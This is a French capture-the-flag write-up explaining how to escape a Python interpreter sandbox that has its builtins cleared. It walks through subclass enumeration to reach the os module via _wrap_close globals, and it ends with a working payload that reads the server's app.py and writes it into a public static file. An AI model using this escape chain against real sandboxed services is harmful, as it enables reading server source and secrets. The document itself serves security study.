# Pyterpreter filters

![img](./0.png)

## Challenge :

On a le même site, et on veut le flag, c'est tout.

## Stratégie :

On peut déjà voir ce qu'on a à notre disposition :

```py
print(1)

> 
```

Hmm... pas grand chose.
On va faire des tests sur l'environnement 1 afin de pouvoir voir ce qu'on fait dans les mêmes conditions :

```py
show = print # On garde print pour avoir des retours
attr = dir # On garde dir pour voir les attributs
__builtins__.__dict__.clear() # On fait comme le challenge actuel mais on garde print et dir
```

On va ensuite essayer de chercher une fonction `open` pour essayer d'ouvrir un fichier par exemple (En partant d'un type) :

```py
show = print # On garde print pour avoir des retours
attr = dir # On garde dir pour voir les attributs
__builtins__.__dict__.clear() # On fait comme le challenge actuel mais on garde print et dir

origin = 1
origin = origin.__class__.__base__.__subclasses__()
show(origin)

> [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'types.GenericAlias'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>] 
```

- On peut voir que `os._wrap_close` est dedans donc on peut avoir os !
- En cherchant un peu plus on peut aussi voir qu'on à `__init__` dans cette valeur. (Et `__globals__` dedans)

```py
show = print
attr = dir 
__builtins__.__dict__.clear() 

origin = 1
origin = origin.__class__.__base__.__subclasses__()
interesting = ""
for f in origin:
    if f.__name__ == '_wrap_close':
       interesting = f

show(attr(interesting))
```

- On peut ensuite regarder quelle fonctions sont disponibles :

```py
show = print
attr = dir 
__builtins__.__dict__.clear() 

origin = 1
origin = origin.__class__.__base__.__subclasses__()
interesting = ""
for f in origin:
    if f.__name__ == '_wrap_close':
       interesting = f

show([i for i in interesting.__init__.__globals__])

> ['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'abc', 'sys', 'st', '_check_methods', 'GenericAlias', '__all__', '_exists', '_get_exports_list', 'name', 'linesep', 'stat', 'access', 'ttyname', 'chdir', 'chmod', 'fchmod', 'chown', 'fchown', 'lchown', 'chroot', 'ctermid', 'getcwd', 'getcwdb', 'link', 'listdir', 'lstat', 'mkdir', 'nice', 'getpriority', 'setpriority', 'posix_spawn', 'posix_spawnp', 'readlink', 'copy_file_range', 'rename', 'replace', 'rmdir', 'symlink', 'system', 'umask', 'uname', 'unlink', 'remove', 'utime', 'times', 'execv', 'execve', 'fork', 'register_at_fork', 'sched_get_priority_max', 'sched_get_priority_min', 'sched_getparam', 'sched_getscheduler', 'sched_rr_get_interval', 'sched_setparam', 'sched_setscheduler', 'sched_yield', 'sched_setaffinity', 'sched_getaffinity', 'openpty', 'forkpty', 'getegid', 'geteuid', 'getgid', 'getgrouplist', 'getgroups', 'getpid', 'getpgrp', 'getppid', 'getuid', 'getlogin', 'kill', 'killpg', 'setuid', 'seteuid', 'setreuid', 'setgid', 'setegid', 'setregid', 'setgroups', 'initgroups', 'getpgid', 'setpgrp', 'wait', 'wait3', 'wait4', 'waitid', 'waitpid', 'pidfd_open', 'getsid', 'setsid', 'setpgid', 'tcgetpgrp', 'tcsetpgrp', 'open', 'close', 'closerange', 'device_encoding', 'dup', 'dup2', 'lockf', 'lseek', 'read', 'readv', 'pread', 'preadv', 'write', 'writev', 'pwrite', 'pwritev', 'sendfile', 'fstat', 'isatty', 'pipe', 'pipe2', 'mkfifo', 'mknod', 'major', 'minor', 'makedev', 'ftruncate', 'truncate', 'posix_fallocate', 'posix_fadvise', 'putenv', 'unsetenv', 'strerror', 'fchdir', 'fsync', 'sync', 'fdatasync', 'WCOREDUMP', 'WIFCONTINUED', 'WIFSTOPPED', 'WIFSIGNALED', 'WIFEXITED', 'WEXITSTATUS', 'WTERMSIG', 'WSTOPSIG', 'fstatvfs', 'statvfs', 'confstr', 'sysconf', 'fpathconf', 'pathconf', 'abort', 'getloadavg', 'urandom', 'setresuid', 'setresgid', 'getresuid', 'getresgid', 'getxattr', 'setxattr', 'removexattr', 'listxattr', 'get_terminal_size', 'cpu_count', 'get_inheritable', 'set_inheritable', 'get_blocking', 'set_blocking', 'scandir', 'fspath', 'getrandom', 'memfd_create', 'waitstatus_to_exitcode', 'environ', 'F_OK', 'R_OK', 'W_OK', 'X_OK', 'NGROUPS_MAX', 'TMP_MAX', 'WCONTINUED', 'WNOHANG', 'WUNTRACED', 'O_RDONLY', 'O_WRONLY', 'O_RDWR', 'O_NDELAY', 'O_NONBLOCK', 'O_APPEND', 'O_DSYNC', 'O_RSYNC', 'O_SYNC', 'O_NOCTTY', 'O_CREAT', 'O_EXCL', 'O_TRUNC', 'O_LARGEFILE', 'O_PATH', 'O_TMPFILE', 'PRIO_PROCESS', 'PRIO_PGRP', 'PRIO_USER', 'O_CLOEXEC', 'O_ACCMODE', 'SEEK_HOLE', 'SEEK_DATA', 'O_ASYNC', 'O_DIRECT', 'O_DIRECTORY', 'O_NOFOLLOW', 'O_NOATIME', 'EX_OK', 'EX_USAGE', 'EX_DATAERR', 'EX_NOINPUT', 'EX_NOUSER', 'EX_NOHOST', 'EX_UNAVAILABLE', 'EX_SOFTWARE', 'EX_OSERR', 'EX_OSFILE', 'EX_CANTCREAT', 'EX_IOERR', 'EX_TEMPFAIL', 'EX_PROTOCOL', 'EX_NOPERM', 'EX_CONFIG', 'ST_RDONLY', 'ST_NOSUID', 'ST_NODEV', 'ST_NOEXEC', 'ST_SYNCHRONOUS', 'ST_MANDLOCK', 'ST_WRITE', 'ST_APPEND', 'ST_NOATIME', 'ST_NODIRATIME', 'ST_RELATIME', 'POSIX_FADV_NORMAL', 'POSIX_FADV_SEQUENTIAL', 'POSIX_FADV_RANDOM', 'POSIX_FADV_NOREUSE', 'POSIX_FADV_WILLNEED', 'POSIX_FADV_DONTNEED', 'P_PID', 'P_PGID', 'P_ALL', 'P_PIDFD', 'WEXITED', 'WNOWAIT', 'WSTOPPED', 'CLD_EXITED', 'CLD_KILLED', 'CLD_DUMPED', 'CLD_TRAPPED', 'CLD_STOPPED', 'CLD_CONTINUED', 'F_LOCK', 'F_TLOCK', 'F_ULOCK', 'F_TEST', 'RWF_DSYNC', 'RWF_HIPRI', 'RWF_SYNC', 'RWF_NOWAIT', 'POSIX_SPAWN_OPEN', 'POSIX_SPAWN_CLOSE', 'POSIX_SPAWN_DUP2', 'SCHED_OTHER', 'SCHED_FIFO', 'SCHED_RR', 'SCHED_BATCH', 'SCHED_IDLE', 'SCHED_RESET_ON_FORK', 'XATTR_CREATE', 'XATTR_REPLACE', 'XATTR_SIZE_MAX', 'RTLD_LAZY', 'RTLD_NOW', 'RTLD_GLOBAL', 'RTLD_LOCAL', 'RTLD_NODELETE', 'RTLD_NOLOAD', 'RTLD_DEEPBIND', 'GRND_RANDOM', 'GRND_NONBLOCK', 'MFD_CLOEXEC', 'MFD_ALLOW_SEALING', 'MFD_HUGETLB', 'MFD_HUGE_SHIFT', 'MFD_HUGE_MASK', 'MFD_HUGE_64KB', 'MFD_HUGE_512KB', 'MFD_HUGE_1MB', 'MFD_HUGE_2MB', 'MFD_HUGE_8MB', 'MFD_HUGE_16MB', 'MFD_HUGE_32MB', 'MFD_HUGE_256MB', 'MFD_HUGE_512MB', 'MFD_HUGE_1GB', 'MFD_HUGE_2GB', 'MFD_HUGE_16GB', 'pathconf_names', 'confstr_names', 'sysconf_names', 'error', 'waitid_result', 'stat_result', 'statvfs_result', 'sched_param', 'terminal_size', 'DirEntry', 'times_result', 'uname_result', '_exit', 'path', 'curdir', 'pardir', 'sep', 'pathsep', 'defpath', 'extsep', 'altsep', 'devnull', 'supports_dir_fd', 'supports_effective_ids', 'supports_fd', 'supports_follow_symlinks', 'SEEK_SET', 'SEEK_CUR', 'SEEK_END', 'makedirs', 'removedirs', 'renames', 'walk', '_walk', 'fwalk', '_fwalk', 'execl', 'execle', 'execlp', 'execlpe', 'execvp', 'execvpe', '_execvpe', 'get_exec_path', 'MutableMapping', 'Mapping', '_Environ', 'getenv', 'supports_bytes_environ', 'environb', 'getenvb', 'fsencode', 'fsdecode', 'P_WAIT', 'P_NOWAIT', 'P_NOWAITO', '_spawnvef', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'popen', '_wrap_close', 'fdopen', '_fspath', 'PathLike'] 
```


- Et on voit qu'on à tout ce qui nous faut. (Il faudra regarder la doc pour `os.open` pour nous aider)
- Avec cette aide on peut donc conclure que ceci devrais marcher :

```py
origin = 1
origin = origin.__class__.__base__.__subclasses__()
interesting = ""
for f in origin:
    if f.__name__ == '_wrap_close':
       interesting = f

os = interesting.__init__.__globals__
fd = os["open"]("app.py", 0) # Flag important pour les permissions
fd2 = os['open']("static/out.txt", 66) # On écrit dans ce fichier pour y accéder via le navigateur (notre stdout perso)
os['lseek'](fd,0,0) # On met le curseur a 0
str = os['read'](fd, 2000) # On lit le fichier 
os['write'](fd2,str) # Et on enregistre
```

- On peut ensuite récupérer notre sortie ici : https://pyterpreter3.valekoz.fr/static/out.txt